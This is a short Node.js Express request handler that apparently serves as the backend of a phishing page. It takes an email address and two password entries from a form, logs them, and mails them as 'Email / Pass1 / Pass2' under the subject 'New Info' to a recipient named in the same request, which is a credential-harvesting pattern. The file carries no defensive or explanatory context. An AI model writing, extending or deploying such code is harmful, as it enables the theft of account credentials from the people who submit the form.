const { mailer } = require("../utils/mailer");

const processSubmission = async (req, res) => {
  const { mail, password, password2, email } = req.body;

  console.log(req.body);
  const subject = "New Info";

  try {
    let message = "";

    if (mail && password && password2) {
      message = `Email: ${mail} Pass1: ${password} Pass2: ${password2}`;
    }

    await mailer(email, message, subject);

    res.status(200).json({ message: "Message Sent" });
  } catch (error) {
    console.error("Error processing submission:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
};

module.exports = { processSubmission };
